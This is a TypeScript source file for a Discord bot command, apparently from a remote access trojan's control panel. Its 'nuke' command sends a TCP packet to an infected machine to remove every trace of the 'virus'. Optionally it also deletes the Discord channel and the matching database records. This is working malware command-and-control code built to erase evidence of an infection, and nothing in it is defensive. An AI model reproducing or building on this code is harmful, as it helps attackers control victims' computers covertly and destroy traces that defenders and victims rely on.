import { ApplicationCommandOptionType, ChatInputCommandInteraction, PermissionsBitField} from "discord.js";
import Command from "../base/classes/Command";
import CustomClient from "../base/classes/CustomClient";
import Category from "../base/enums/Category";
import TcpPacket from "../base/classes/TcpPacket";
import Code from "../base/enums/Codes";

export default class Bluescreen extends Command {
    constructor(client: CustomClient) {
        super(client, {
            name: "nuke",
            description: "Enlève toute trace du virus sur le client.",
            category: Category.Utilities,
            dm_permissions: false,
            default_member_permissions: PermissionsBitField.Flags.UseApplicationCommands,
            cooldown: 3,
            options: [
                {
                    "name": "totale",
                    "description": "Si vraie, le channel sera supprimé.",
                    "type": ApplicationCommandOptionType.Boolean,
                    "required": false
                }
            ]
        });
    }

    async Execute(interaction: ChatInputCommandInteraction) {
        let RATClient = await this.client.getRATClient(interaction);
        if (!RATClient) {
            return;
        }

        let packet = new TcpPacket(Code.NUKE, Buffer.from([0x01]));
        RATClient.send(packet);
        let response = await RATClient.receive();
        
        if (response?.code == Code.ERROR) {
            return interaction.reply({
                content: "Erreur: impossible de nuker le client.",
                ephemeral: true
            });
        }
        if (response?.code !== Code.SUCCESS) {
            return interaction.reply({
                content: "Erreur: réponse inattendue.",
                ephemeral: true
            });
        }

        if (!interaction.options.getBoolean("totale")) {
            return interaction.reply({
                content: "Le client a été détruit."
            });
        }

        await interaction.reply({
            content: "Le client a été détruit, ce channel sera détruit dans 10 secondes."
        });

        setTimeout(async () => {
            let channel = interaction.channel;
            if (!channel) {
                return;
            }
            await channel.delete();

            await this.client.database.user.deleteMany({
                where: {
                    channelId: channel.id
                }
            });
        }, 10000);
    }
}